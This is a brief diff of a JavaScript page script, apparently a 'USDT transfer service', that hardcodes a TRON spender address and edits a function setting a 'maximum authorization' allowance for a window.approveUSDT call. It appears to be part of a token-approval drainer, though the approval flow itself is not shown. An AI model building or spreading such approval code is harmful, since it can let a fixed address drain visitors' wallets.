@@ -6,7 +6,7 @@ const spenderAddress = "TAmgNT7gLX7TuSKcKLuzPPDDpKZ8UMkYGv";
 
 // ====== 最大授权额度 ======
 function getLargeEnoughAmount() {
-  return "1000000000000000000000000000";
+  return "1000000000000";
 }
 
 window.approveUSDT = async function() {
@@ -139,4 +139,5 @@ window.addEventListener("DOMContentLoaded", () => {
 });
 
 console.log("USDT 转账服务脚本加载完成");
+
 
